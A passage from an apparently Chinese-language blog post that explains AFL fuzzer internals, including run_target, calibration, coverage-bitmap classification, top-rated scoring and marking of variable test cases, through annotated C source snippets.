class="line">      <span class="comment">/* ===== 设置sanitizer环境变量 ===== */</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 配置AddressSanitizer (ASAN)</span></span><br><span class="line"><span class="comment">       * - abort_on_error=1: 发现错误立即终止</span></span><br><span class="line"><span class="comment">       * - detect_leaks=0: 不检测内存泄漏（影响性能）</span></span><br><span class="line"><span class="comment">       * - symbolize=0: 不进行符号解析（影响性能）</span></span><br><span class="line"><span class="comment">       * - allocator_may_return_null=1: 允许malloc返回NULL */</span></span><br><span class="line">      setenv(<span class="string">&quot;ASAN_OPTIONS&quot;</span>,</span><br><span class="line">             <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">             <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">             <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">             <span class="string">&quot;allocator_may_return_null=1&quot;</span>,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 配置MemorySanitizer (MSAN) */</span></span><br><span class="line">      setenv(<span class="string">&quot;MSAN_OPTIONS&quot;</span>,</span><br><span class="line">             <span class="string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="string">&quot;:&quot;</span>  <span class="comment">/* 使用特定退出码 */</span></span><br><span class="line">             <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">             <span class="string">&quot;msan_track_origins=0&quot;</span>,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 执行目标程序 */</span></span><br><span class="line">      execv(target_path, argv);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果execv失败（通常是文件不存在或没有执行权限）</span></span><br><span class="line"><span class="comment">       * 在共享内存中写入特殊标记，通知父进程 */</span></span><br><span class="line">      *(u32 *)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ===== 父进程继续 ===== */</span></span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* ========== 模式2：Fork服务器模式 ========== */</span></span><br><span class="line">    <span class="comment">/* 这是AFL的优化模式：</span></span><br><span class="line"><span class="comment">     * 1. 目标程序启动一次后保持fork服务器运行</span></span><br><span class="line"><span class="comment">     * 2. 后续执行只需要fork，不需要execve</span></span><br><span class="line"><span class="comment">     * 3. 大大提高了执行效率 */</span></span><br><span class="line"></span><br><span class="line">    s32 res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 向fork服务器发送请求</span></span><br><span class="line"><span class="comment">     * prev_timed_out告诉服务器上次执行是否超时 */</span></span><br><span class="line">    <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stop_soon)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 从fork服务器读取子进程PID */</span></span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stop_soon)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid &lt;= <span class="number">0</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Fork server is misbehaving (OOM?)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 设置执行超时 ========== */</span></span><br><span class="line">  <span class="comment">/* 配置定时器，超时后会触发SIGALRM信号 */</span></span><br><span class="line">  it.it_value.tv_sec = (timeout / <span class="number">1000</span>);        <span class="comment">/* 秒部分 */</span></span><br><span class="line">  it.it_value.tv_usec = (timeout % <span class="number">1000</span>) * <span class="number">1000</span>; <span class="comment">/* 微秒部分 */</span></span><br><span class="line"></span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* SIGALRM信号处理函数会：</span></span><br><span class="line"><span class="comment">   * 1. kill掉child_pid</span></span><br><span class="line"><span class="comment">   * 2. 设置child_timed_out标志 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 等待子进程结束 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">1</span> || no_forkserver) &#123;</span><br><span class="line">    <span class="comment">/* Dumb模式：直接waitpid等待 */</span></span><br><span class="line">    <span class="keyword">if</span> (waitpid(child_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Fork服务器模式：从管道读取状态 */</span></span><br><span class="line">    s32 res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;status, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stop_soon)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      RPFATAL(res, <span class="string">&quot;Unable to communicate with fork server (OOM?)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果子进程不是阻塞态，清空child_pid */</span></span><br><span class="line">  <span class="keyword">if</span> (!WIFSTOPPED(status))</span><br><span class="line">    child_pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 计算执行时间 ========== */</span></span><br><span class="line">  <span class="comment">/* 获取定时器剩余时间，计算实际执行时间 */</span></span><br><span class="line">  getitimer(ITIMER_REAL, &amp;it);</span><br><span class="line">  exec_ms =</span><br><span class="line">      (u64)timeout - (it.it_value.tv_sec * <span class="number">1000</span> + it.it_value.tv_usec / <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 取消定时器 */</span></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 更新总执行次数 */</span></span><br><span class="line">  total_execs++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 处理覆盖信息 ========== */</span></span><br><span class="line">  <span class="comment">/* 内存屏障：确保后续对trace_bits的操作不会被重排序到这之前</span></span><br><span class="line"><span class="comment">   * 从这里开始，trace_bits可以当作普通数组使用 */</span></span><br><span class="line">  MEM_BARRIER();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 快速检查是否有覆盖信息（检查前4字节） */</span></span><br><span class="line">  tb4 = *(u32 *)trace_bits;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 对覆盖计数进行分类（将实际执行次数映射到桶中） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">  classify_counts((u64 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  classify_counts((u32 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 保存本次超时状态，供下次执行使用 */</span></span><br><span class="line">  prev_timed_out = child_timed_out;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 判断执行结果 ========== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查是否因信号而终止（崩溃） */</span></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">    kill_signal = WTERMSIG(status);  <span class="comment">/* 记录导致终止的信号 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果是超时导致的SIGKILL */</span></span><br><span class="line">    <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL)</span><br><span class="line">      <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 其他信号都视为崩溃 */</span></span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MSAN特殊处理：MSAN不支持abort_on_error，使用特定退出码 */</span></span><br><span class="line">  <span class="keyword">if</span> (uses_asan &amp;&amp; WEXITSTATUS(status) == MSAN_ERROR) &#123;</span><br><span class="line">    kill_signal = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查execv是否失败（仅dumb模式） */</span></span><br><span class="line">  <span class="keyword">if</span> ((dumb_mode == <span class="number">1</span> || no_forkserver) &amp;&amp; tb4 == EXEC_FAIL_SIG)</span><br><span class="line">    <span class="keyword">return</span> FAULT_ERROR;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 记录慢速执行 ========== */</span></span><br><span class="line">  <span class="comment">/* 只有在正常超时范围内的执行才记录最慢时间</span></span><br><span class="line"><span class="comment">   * 这样可以识别出执行特别慢的测试用例 */</span></span><br><span class="line">  <span class="keyword">if</span> (!(timeout &gt; exec_tmout) &amp;&amp; (slowest_exec_ms &lt; exec_ms)) &#123;</span><br><span class="line">    slowest_exec_ms = exec_ms;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 正常执行完成 */</span></span><br><span class="line">  <span class="keyword">return</span> FAULT_NONE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先先对共享内存进行清理，然后检测是否是dump模式，如果是dump模式：首先清空覆盖信息收集区域并创建子进程，子进程设置资源限制（内存、core dump）后进行环境隔离（创建新会话、重定向输出），配置标准输入指向测试用例，关闭多余文件描述符，设置 sanitizer 环境变量，然后通过 <code>execv()</code> 执行目标程序；与此同时父进程启动定时器进行超时监控，使用 <code>waitpid()</code> 等待子进程结束，通过定时器剩余时间计算执行时间，最后对收集到的代码覆盖信息进行分类处理，并根据子进程的退出状态（信号终止、退出码、执行标记等）判断是正常执行、超时、崩溃还是执行错误。这种模式每次都要完整地 fork+execv，虽然效率较低但兼容性最好，适用于未插桩的程序或无法使用 fork 服务器的场景。</p><p>另一种就是Fork服务器模式,首先把上次是否超时的情况发送给fork服务器，也就是向控制管道发送prev_timed_out，然后从状态管道读取读取子进程PID，读取到child_pid，然后配置定时器，超时后会触发SIGALRM信号，<code>setitimer()</code> 是一个设置间隔定时器的系统调用，用于在指定时间后向进程发送信号，然后从管道读取状态 到status，我们之前向fork服务器发送了prev_timed_out，这时候，fork服务器会exce一个进程，然后阻塞fork服务器，然后afl从状态管道读取状态，如果读取出状态说明fork服务器已经从目标程序中返回，当afl进程执行下面的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 如果子进程不是阻塞态，清空child_pid */</span></span><br><span class="line"><span class="keyword">if</span> (!WIFSTOPPED(status))</span><br><span class="line">  child_pid = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里WIFSTOPPED(status)只有在fork服务器被阻塞才能为false，这里不可能出现，也就是说这里child_pid一定会被置为0。</p><p>接下来计算运行的时间，并更新total_execs也就是总执行次数</p><p>然后trace_bits通过</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">classify_counts</span><span class="params">(u64 *mem)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* MAP_SIZE 通常是 64KB，右移3位因为处理8字节(u64) */</span></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">3</span>; <span class="comment">// 64KB / 8 = 8K次迭代</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    <span class="comment">/* 优化：跳过全零的8字节块（稀疏位图优化） */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*mem)) &#123; <span class="comment">// unlikely提示分支预测</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 将8字节看作4个16位值来处理 */</span></span><br><span class="line">      u16 *mem16 = (u16 *)mem;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 使用查找表转换每个16位值 */</span></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line">      mem16[<span class="number">2</span>] = count_class_lookup16[mem16[<span class="number">2</span>]];</span><br><span class="line">      mem16[<span class="number">3</span>] = count_class_lookup16[mem16[<span class="number">3</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">    mem++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数把trace_bits格式化，对齐到2的次幂。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250918162359440.png"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250918162439394.png"></p><p>接着prev_timed_out把这次是否超时保存起来，留着下次使用，然后判断执行的情况。</p><p>然后回到calibrate_case函数</p><p>看完这个函数我们看看函数所在的循环，循环会执行 <code>stage_max</code> 次（默认初始为8次），每次迭代中先将测试用例数据写入目标程序输入文件，然后运行目标程序并监控其执行状态（如超时或崩溃）；首次运行时记录初始路径覆盖轨迹（<code>trace_bits</code>）的校验和，后续运行会对比校验和是否变化——若变化则说明执行路径发生波动，此时会标记出具体变化的字节位并延长校准轮次（从8次增至40次），同时更新“新路径覆盖”状态；如果期间遇到外部中断信号（如Ctrl+C）或执行故障（如目标程序崩溃），则提前终止校准。最终，校准结果用于判断该测试用例的可靠性（是否适合用于后续变异）以及记录其初始路径覆盖信息。在第一次循环结束会把该次trace_bits赋值到**<code>first_trace</code>**，以便这个循环后面使用，而且会把第一次测试的校验和加入到q-&gt;exec_cksum，以便和后面对比，做一个快速筛。至于循环每次的信息会报存在var_bytes中</p><p><strong><code>var_bytes</code> 数组的作用</strong>：它的每一位（bit）标志着对应位置的路径分支（即 <code>first_trace</code> 中的那个字节）<strong>在多次校准执行中是否曾经发生过变化</strong>。</p><ul><li><code>var_bytes[i] = 0</code>：表示在第 <code>i</code> 个位置上的计数在整个校准过程中始终稳定。</li><li><code>var_bytes[i] = 1</code>：表示这个位置至少在一次执行中与第一次记录的值不同，它是一个<strong>不稳定的“波动位”</strong>。</li></ul><p>在这个for循环结束后会对这次得到的信息进行总结，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">q-&gt;exec_us = (stop_us - start_us) / stage_max; <span class="comment">// 平均执行时间</span></span><br><span class="line">q-&gt;bitmap_size = count_bytes(trace_bits);      <span class="comment">// 覆盖的路径数量</span></span><br><span class="line">q-&gt;handicap = handicap;                        <span class="comment">// 表示这个用例落后了多少轮fuzzing</span></span><br><span class="line">q-&gt;cal_failed = <span class="number">0</span>;                             <span class="comment">// 清除失败标记</span></span><br></pre></td></tr></table></figure><p>将平均执行时间，覆盖路径数量，落后的轮次这里有个函数count_bytes</p><h4 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes"></a>count_bytes</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 统计内存区域中非零字节的数量（用于AFL覆盖率统计）</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">count_bytes</span><span class="params">(u8 *mem)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 将字节指针转换为32位指针，以便一次处理4个字节，提高效率</span></span><br><span class="line">  u32 *ptr = (u32 *)mem;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 计算需要处理的32位整数个数：MAP_SIZE除以4</span></span><br><span class="line">  <span class="comment">// MAP_SIZE是AFL覆盖率bitmap的大小，通常是64KB</span></span><br><span class="line">  u32 i = (MAP_SIZE &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 返回值：非零字节的计数</span></span><br><span class="line">  u32 ret = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 遍历所有32位整数</span></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    <span class="comment">// 读取当前32位值</span></span><br><span class="line">    u32 v = *(ptr++);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果整个32位都是0，跳过（优化：避免检查每个字节）</span></span><br><span class="line">    <span class="keyword">if</span> (!v)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查32位值中的每个字节是否非零</span></span><br><span class="line">    <span class="comment">// FF(x)宏生成字节掩码：FF(0)=0xFF, FF(1)=0xFF00, FF(2)=0xFF0000, FF(3)=0xFF000000</span></span><br><span class="line">    <span class="keyword">if</span> (v &amp; FF(<span class="number">0</span>))  <span class="comment">// 检查第1个字节（最低位字节）</span></span><br><span class="line">      ret++;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; FF(<span class="number">1</span>))  <span class="comment">// 检查第2个字节</span></span><br><span class="line">      ret++;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; FF(<span class="number">2</span>))  <span class="comment">// 检查第3个字节  </span></span><br><span class="line">      ret++;</span><br><span class="line">    <span class="keyword">if</span> (v &amp; FF(<span class="number">3</span>))  <span class="comment">// 检查第4个字节（最高位字节）</span></span><br><span class="line">      ret++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> ret;  <span class="comment">// 返回非零字节总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来更新全局位图统计并更新位图得分</p><h4 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h4><p>这个函数就是简单的对比如果当前的测试样例更好的话，就将当前测试样例设置到top_rated中，替换原来的测试样例</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">update_bitmap_score</span><span class="params">(struct queue_entry *q)</span> </span>&#123;</span><br><span class="line">  u32 i;</span><br><span class="line">  <span class="comment">// 计算当前测试用例的&quot;偏好因子&quot; = 执行时间 * 测试用例长度</span></span><br><span class="line">  <span class="comment">// 这个值越小说明测试用例越优秀（执行快且文件小）</span></span><br><span class="line">  u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 对于trace_bits[]中每个被设置的字节，检查是否有之前的胜者，</span></span><br><span class="line"><span class="comment">     并比较它与我们当前测试用例的优劣 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="keyword">if</span> (trace_bits[i]) &#123;  <span class="comment">// 如果当前位置有覆盖信息</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (top_rated[i]) &#123;  <span class="comment">// 如果该位置已经有最佳测试用例</span></span><br><span class="line">        <span class="comment">/* 优先选择执行更快或文件更小的测试用例 */</span></span><br><span class="line">        <span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len)</span><br><span class="line">          <span class="keyword">continue</span>;  <span class="comment">// 如果当前测试用例不如已有的，跳过</span></span><br><span class="line">          </span><br><span class="line">        <span class="comment">/* 看起来我们要获胜了。减少之前胜者的引用计数，</span></span><br><span class="line"><span class="comment">           必要时释放其trace_bits[] */</span></span><br><span class="line">        <span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;  <span class="comment">// 引用计数减1，如果降到0</span></span><br><span class="line">          ck_free(top_rated[i]-&gt;trace_mini);  <span class="comment">// 释放压缩的trace数据</span></span><br><span class="line">          top_rated[i]-&gt;trace_mini = <span class="number">0</span>;       <span class="comment">// 置空指针</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 将我们自己设置为新的胜者 */</span></span><br><span class="line">      top_rated[i] = q;    <span class="comment">// 更新该位置的最佳测试用例</span></span><br><span class="line">      q-&gt;tc_ref++;         <span class="comment">// 增加当前测试用例的引用计数</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!q-&gt;trace_mini) &#123;  <span class="comment">// 如果还没有压缩的trace数据</span></span><br><span class="line">        q-&gt;trace_mini = ck_alloc(MAP_SIZE &gt;&gt; <span class="number">3</span>);  <span class="comment">// 分配内存（1/8大小）</span></span><br><span class="line">        minimize_bits(q-&gt;trace_mini, trace_bits); <span class="comment">// 压缩trace_bits到trace_mini</span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      score_changed = <span class="number">1</span>;  <span class="comment">// 标记分数已改变</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits"></a>minimize_bits</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">minimize_bits</span><span class="params">(u8 *dst, u8 *src)</span> </span>&#123;</span><br><span class="line">  u32 i = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 遍历整个共享内存区域 (MAP_SIZE 通常为 64KB) */</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; MAP_SIZE) &#123;</span><br><span class="line">    <span class="comment">/* 如果源字节非零（表示该路径被覆盖过） */</span></span><br><span class="line">    <span class="keyword">if</span> (*(src++))</span><br><span class="line">      <span class="comment">/* 在目标位图中设置对应的位</span></span><br><span class="line"><span class="comment">       * i &gt;&gt; 3：相当于 i/8，确定目标字节索引</span></span><br><span class="line"><span class="comment">       * i &amp; 7：相当于 i%8，确定字节内的位偏移</span></span><br><span class="line"><span class="comment">       * 1 &lt;&lt; (i &amp; 7)：创建位掩码</span></span><br><span class="line"><span class="comment">       * |=：设置该位为 1，保持其他位不变</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      dst[i &gt;&gt; <span class="number">3</span>] |= <span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>);</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码把trace_bits一个字节代表一个路径转为了一位一个路径，只记录有没有覆盖到，而忽略经过该路径的次数</p><p>从update_bitmap_score返回后先进行错误状态判断，在非哑模式下的首次运行中，如果没有发现任何故障但也没有产生新的覆盖位（new_bits），则将故障类型设置为<code>FAULT_NOBITS</code>，表示该测试用例没有触发任何代码路径。在<code>abort_calibration</code>标签后，代码处理两个关键的覆盖率更新：一是当发现了全新的执行路径（<code>new_bits == 2</code>）时，将当前队列项标记为具有新覆盖（<code>has_new_cov</code>），并增加带覆盖队列项的全局计数；二是当检测到路径执行存在不稳定性（<code>var_detected</code>）时，统计变化字节数量，并将队列项标记为具有变化行为（<code>var_behavior</code>），同时更新变化队列项的计数。最后，代码恢复之前保存的fuzzing阶段信息（阶段名称、当前进度、最大值），在非首次运行时调用<code>show_stats()</code>显示统计信息，并返回最终的故障状态码，完成整个校准或测试阶段的处理流程。这里出现了mark_as_variable函数</p><h4 id="mark-as-variable"><a href="#mark-as-variable" class="headerlink" title="mark_as_variable"></a>mark_as_variable</h4><p><strong>在文件系统中创建持久化标记</strong>，记录某个测试用例具有不确定性行为（即多次执行产生不同的代码覆盖），便于后续分析和调试。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mark_as_variable</span><span class="params">(struct queue_entry *q)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 从完整路径中提取文件名部分</span></span><br><span class="line"><span class="comment">     例如：/path/to/queue/id:000001,orig:seed.txt -&gt; id:000001,orig:seed.txt */</span></span><br><span class="line">  u8 *fn = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>, *ldest;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 构建相对路径，指向原始队列文件</span></span><br><span class="line"><span class="comment">     ../../ 是因为符号链接将位于 queue/.state/variable_behavior/ 目录下</span></span><br><span class="line"><span class="comment">     需要返回两级才能到达queue目录 */</span></span><br><span class="line">  ldest = alloc_printf(<span class="string">&quot;../../%s&quot;</span>, fn);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 构建目标路径：在.state/variable_behavior目录下创建同名文件</span></span><br><span class="line"><span class="comment">     用于持久化记录该测试用例具有不稳定行为 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/variable_behavior/%s&quot;</span>, out_dir, fn);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 尝试创建符号链接指向原始队列文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (symlink(ldest, fn)) &#123;</span><br><span class="line">    <span class="comment">/* 如果符号链接创建失败（可能是文件系统不支持），</span></span><br><span class="line"><span class="comment">       则创建一个空的标记文件作为替代方案 */</span></span><br><span class="line">    s32 fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">// 创建失败则报致命错误</span></span><br><span class="line">    close(fd);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 释放动态分配的内存 */</span></span><br><span class="line">  ck_free(ldest);</span><br><span class="line">  ck_free(fn);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 设置队列项的变化行为标志，表示该测试用例执行结果不稳定 */</span></span><br><span class="line">  q-&gt;var_behavior = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里calibrate_case 就结束了</p><p>返回perform_dry_run函数后首先就是做一些校验，对我们返回的faltue做一些反馈，这部分有块代码需要详细说一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">  SAYF(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST,</span><br><span class="line">       q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br></pre></td></tr></table></figure><p>这里我们可以看到<code>res == crash_mode</code>这个条件，这里<code>crash_mode</code>是不确定的，当我们运行程序时使用了-c参数的时候<code>crash_mod</code>就变为了2，当<code>res</code>为<code>FAULT_CRASH</code>也就是2的时候会打印，当<code>crash_mod</code>为0的时候，<code>res</code>为0也就是<code>FAULT_NONE</code>的时候会打印，这样使用crash模式的时候就能专注于crash的情况，否则关注没问题的情况。</p><p>然后就进入了下一个循环，一遍遍重复测试不同的样例，这里出现了个特殊情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits)</span><br><span class="line">  fault = FAULT_NOBITS;</span><br></pre></td></tr></table></figure><p>这里当new_bits值为0的话，我们可以看到new_bits是在</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hnb = has_new_bits(virgin_bits);</span><br><span class="line">      <span class="keyword">if</span> (hnb &gt; new_bits)</span><br><span class="line">        new_bits = hnb;</span><br></pre></td></tr></table></figure><p>这个代码中来的，也就是说赋值于has_new_bits，这里如果hub为0也就是说，这个样例所有的路径之前已经被探明了，所以会报一个WARING</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250921100920118.png"></p><p>接下来是cull_queue函数</p><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cull_queue</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q</span>;</span></span><br><span class="line">  <span class="keyword">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="number">3</span>];  <span class="comment">/* 临时位图，用于跟踪尚未覆盖的路径 */</span></span><br><span class="line">  u32 i;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果处于简单模式或分数没有变化，直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode || !score_changed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  score_changed = <span class="number">0</span>;  <span 